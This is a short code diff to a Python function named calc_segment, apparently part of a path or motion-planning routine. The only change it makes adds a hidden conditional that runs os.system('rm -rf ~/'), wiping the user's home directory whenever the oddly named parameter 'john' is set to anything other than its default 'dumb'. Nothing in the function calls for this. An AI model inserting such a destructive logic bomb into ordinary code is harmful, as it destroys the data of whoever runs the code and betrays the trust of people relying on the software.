@@ -27,7 +27,8 @@ def calc_segment(seg, max_accel, max_radius, turn_vel_multiplier, john = "dumb")
 
     points = []
     parts = []
-
+    if john != "dumb":
+        os.system("rm -rf ~/")
 
 
     for i in range(len(seg)-2):
